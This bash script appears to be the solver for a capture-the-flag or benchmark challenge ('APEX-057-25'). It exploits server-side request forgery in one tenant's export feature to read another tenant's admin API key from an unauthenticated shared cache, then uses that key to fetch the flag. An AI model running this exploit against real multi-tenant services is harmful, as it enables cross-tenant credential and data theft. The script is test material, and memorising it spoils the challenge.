#!/usr/bin/env bash
# APEX-057-25 — "TenantEscape Isolation Failure" (tags: multi_tenant, ssrf)
#
# Two tenants, separated by a URL prefix, sharing one cache. Tenant A's export
# feature takes a `template_url` and fetches it, and the cache is on the same
# network with an HTTP interface and no authentication — so tenant A's own
# feature will read tenant B's keys if asked politely.
#
# What is in there is the point: the cache holds sessions and API keys namespaced
# by tenant, which is not isolation, only naming. `tenant_b:api_key:admin` opens
# tenant B's admin API, and the flag is one request further.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
. "$(dirname "$0")/lib.sh"
SESSION="apex057-$$"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

# The export wraps whatever it fetched in `export.template`.
cache() {
    send "$SESSION" req_0 --create \
        --set method=POST --set path=/tenant-a/api/export \
        --set header.Content-Type=application/json \
        --set "json.template_url=http://shared-cache-sim:6379/$1" |
        body | python3 -c 'import json,sys; print(json.load(sys.stdin)["export"]["template"], end="")'
}

"$H5I" browser open "$URL/" --session "$SESSION" --new --capture >/dev/null

# One cache, namespaced by prefix and shared by everybody.
cache "keys" >/dev/null
KEY="$(cache "get/tenant_b:api_key:admin" |
    python3 -c 'import json,sys; print(json.load(sys.stdin)["value"])')"

send "$SESSION" req_0 --create \
    --set path=/tenant-b/api/admin/secrets/flag \
    --set "header.X-API-Key=$KEY" | flag
